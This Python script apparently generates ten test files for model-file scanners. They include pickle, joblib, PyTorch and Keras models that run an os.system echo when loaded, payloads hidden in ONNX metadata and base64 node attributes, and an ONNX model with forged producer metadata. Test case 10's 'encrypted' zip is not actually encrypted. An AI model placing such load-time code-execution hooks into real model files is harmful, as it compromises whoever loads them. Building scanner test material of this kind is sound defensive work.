import tensorflow as tf
from tensorflow.keras import layers
import torch
import torch.nn as nn
import onnx
from onnx import helper, TensorProto
import pickle
import joblib
from sklearn.linear_model import LinearRegression
import zipfile
import base64
import os

# Test Case 1: Malicious Payload in .pb Graph (TensorFlow-Based Models)
def generate_test_case_1():
    """Malicious Payload in .pb Graph (TensorFlow-Based Models)"""
    def malicious_function(x):
        import os
        os.system("echo 'Malicious code executed! (TF SavedModel)' > /tmp/malicious.txt")
        return x
    inputs = tf.keras.Input(shape=(10,))
    x = layers.Dense(10)(inputs)
    x = layers.Lambda(malicious_function)(x)
    outputs = layers.Dense(1)(x)
    model = tf.keras.Model(inputs, outputs)
    model.save("./malicious_model_tf", save_format='tf')
    print("Test case 1 generated: malicious_model_tf")

# Test Case 2: Obfuscated Code in .h5 (Keras)
def generate_test_case_2():
    """Obfuscated Code in .h5 (Keras)"""
    def malicious_function(x):
        import os
        os.system("echo 'Malicious code executed! (Keras H5)' > /tmp/malicious.txt")
        return x
    inputs = tf.keras.Input(shape=(10,))
    x = layers.Dense(10)(inputs)
    x = layers.Lambda(malicious_function)(x)
    outputs = layers.Dense(1)(x)
    model = tf.keras.Model(inputs, outputs)
    model.save("./malicious_model_keras.h5")
    print("Test case 2 generated: malicious_model_keras.h5")

# Test Case 3: Trojanized SavedModel Directory (TensorFlow)
def generate_test_case_3():
    """Trojanized SavedModel Directory (TensorFlow)"""
    inputs = tf.keras.Input(shape=(10,))
    outputs = tf.keras.layers.Dense(1)(inputs)
    model = tf.keras.Model(inputs, outputs)
    model_save_path = "./malicious_saved_model_trojanized"
    tf.saved_model.save(model, model_save_path)
    assets_dir = os.path.join(model_save_path, 'assets')
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'malicious.py'), 'w') as f:
        f.write("import os; os.system('echo Malicious code executed! (Trojanized SavedModel) > /tmp/malicious.txt')")
    print("Test case 3 generated: malicious_saved_model_trojanized")

# Test Case 4: Code Injection in .pt / .pth Checkpoints (PyTorch-Based Models)
def generate_test_case_4():
    """Code Injection in .pt / .pth Checkpoints (PyTorch-Based Models)"""
    class MaliciousModel(nn.Module):
        def __init__(self):
            super(MaliciousModel, self).__init__()
            self.linear = nn.Linear(10, 1)
        def __setstate__(self, state):
            super(MaliciousModel, self).__setstate__(state)
            import os
            os.system('echo Malicious code executed! (PyTorch PT) > /tmp/malicious.txt')
    model = MaliciousModel()
    torch.save(model, 'malicious_model_pytorch.pt')
    print("Test case 4 generated: malicious_model_pytorch.pt")

# Test Case 5: Malicious Script in .pkl (Pickle)
def generate_test_case_5():
    """Malicious Script in .pkl (Pickle)"""
    class MaliciousObject:
        def __reduce__(self):
            import os
            return (os.system, ('echo Malicious code executed! (Pickle) > /tmp/malicious.txt',))
    malicious_obj = MaliciousObject()
    with open('malicious_pkl_file.pkl', 'wb') as f:
        pickle.dump(malicious_obj, f)
    print("Test case 5 generated: malicious_pkl_file.pkl")

# Test Case 6: Hidden Payload in ONNX Metadata (ONNX Models)
def generate_test_case_6():
    """Hidden Payload in ONNX Metadata (ONNX Models)"""
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'test_model', [input], [output])
    model = helper.make_model(graph)
    model_metadata = model.metadata_props.add()
    model_metadata.key = "hidden_payload"
    model_metadata.value = "echo Malicious code executed! (ONNX Metadata) > /tmp/malicious.txt"
    onnx.save(model, 'malicious_onnx_model_metadata.onnx')
    print("Test case 6 generated: malicious_onnx_model_metadata.onnx")

# Test Case 7: Large Encoded Blobs in Node Attributes (ONNX Models)
def generate_test_case_7():
    """Large Encoded Blobs in Node Attributes (ONNX Models)"""
    malicious_code = "echo Malicious code executed! (ONNX Node Attributes) > /tmp/malicious.txt"
    encoded_malicious_code = base64.b64encode(malicious_code.encode()).decode()
    node = helper.make_node('CustomOp', ['input'], ['output'], domain='custom', attr_str=encoded_malicious_code)
    graph = helper.make_graph([node], 'test_model', [],[])
    model = helper.make_model(graph)
    onnx.save(model, 'malicious_onnx_model_node_attributes.onnx')
    print("Test case 7 generated: malicious_onnx_model_node_attributes.onnx")

# Test Case 8: Malicious Code in scikit-learn .joblib or .pkl
def generate_test_case_8():
    """Malicious Code in scikit-learn .joblib or .pkl"""
    class MaliciousObject:
        def __reduce__(self):
            import os
            return (os.system, ('echo Malicious code executed! (Scikit-learn Joblib) > /tmp/malicious.txt',))
    model = LinearRegression()
    model.__dict__['malicious'] = MaliciousObject()
    joblib.dump(model, 'malicious_model_sklearn.joblib')
    print("Test case 8 generated: malicious_model_sklearn.joblib")

# Test Case 9: Signature Forging or Tampered Metadata (Other AI Model Formats)
def generate_test_case_9():
    """Signature Forging or Tampered Metadata (Other AI Model Formats)"""
    if not os.path.exists('trusted_model.onnx'):
        print("Error: trusted_model.onnx not found. Please provide a trusted ONNX model.")
        return
    trusted_model = onnx.load('trusted_model.onnx')
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'malicious_model', [input], [output])
    malicious_model = helper.make_model(graph)
    malicious_model.producer_name = trusted_model.producer_name
    malicious_model.producer_version = trusted_model.producer_version
    malicious_model.domain = trusted_model.domain
    malicious_model.model_version = trusted_model.model_version
    onnx.save(malicious_model, 'forged_malicious_onnx_model.onnx')
    print("Test case 9 generated: forged_malicious_onnx_model.onnx")

# Test Case 10: Encrypted / Password-Protected Model Files (Other AI Model Formats)
def generate_test_case_10():
    """Encrypted / Password-Protected Model Files (Other AI Model Formats)"""
    class SimpleModel(nn.Module):
        def __init__(self):
            super(SimpleModel, self).__init__()
            self.linear = nn.Linear(1, 1)
        def forward(self, x):
            return self.linear(x)
    model = SimpleModel()
    torch.save(model, 'model.pt')
    password = 'secret'
    with zipfile.ZipFile('encrypted_model.zip', 'w') as zip_file:
        zip_file.setpassword(password.encode())
        zip_file.write('model.pt', arcname='model.pt')
    print("Test case 10 generated: encrypted_model.zip")

# Main function to handle user input and generate test cases
def main():
    test_cases = {
        '1': generate_test_case_1,
        '2': generate_test_case_2,
        '3': generate_test_case_3,
        '4': generate_test_case_4,
        '5': generate_test_case_5,
        '6': generate_test_case_6,
        '7': generate_test_case_7,
        '8': generate_test_case_8,
        '9': generate_test_case_9,
        '10': generate_test_case_10
    }

    print("Select a test case to generate (1-10) or 'all' to generate all:")
    print("1. Malicious Payload in .pb Graph (TensorFlow-Based Models)")
    print("2. Obfuscated Code in .h5 (Keras)")
    print("3. Trojanized SavedModel Directory (TensorFlow)")
    print("4. Code Injection in .pt / .pth Checkpoints (PyTorch-Based Models)")
    print("5. Malicious Script in .pkl (Pickle)")
    print("6. Hidden Payload in ONNX Metadata (ONNX Models)")
    print("7. Large Encoded Blobs in Node Attributes (ONNX Models)")
    print("8. Malicious Code in scikit-learn .joblib or .pkl")
    print("9. Signature Forging or Tampered Metadata (Other AI Model Formats)")
    print("10. Encrypted / Password-Protected Model Files (Other AI Model Formats)")

    choice = input("Enter your choice: ").strip().lower()

    if choice == 'all':
        for func in test_cases.values():
            func()
    elif choice in test_cases:
        test_cases[choice]()
    else:
        print("Invalid choice. Please enter a number between 1 and 10 or 'all'.")

if __name__ == "__main__":
    main()